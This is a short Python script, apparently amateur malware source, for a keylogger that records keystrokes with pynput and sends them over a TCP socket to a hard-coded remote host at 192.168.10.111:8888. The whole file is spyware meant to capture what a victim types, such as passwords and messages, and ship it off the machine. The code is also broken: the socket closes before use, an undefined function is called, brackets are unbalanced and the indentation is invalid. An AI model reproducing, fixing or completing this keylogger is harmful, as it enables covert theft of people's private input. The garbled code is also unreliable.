import socket
from pynput.keyboard import Listener

target_hosts="192.168.10.111"
target_port= 8888

#create a TCP socket object
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
    #connect
    client_socket.connect((target_hosts, target_port))
#our small keylogger
def on_press(key):
    #set it to log on the remote pc
    
        log = ((write(str(key) + "\n"))
               client_socket.send(log.encode())
 


               with Listener(on_press=on_press) as listener:
               listener.join
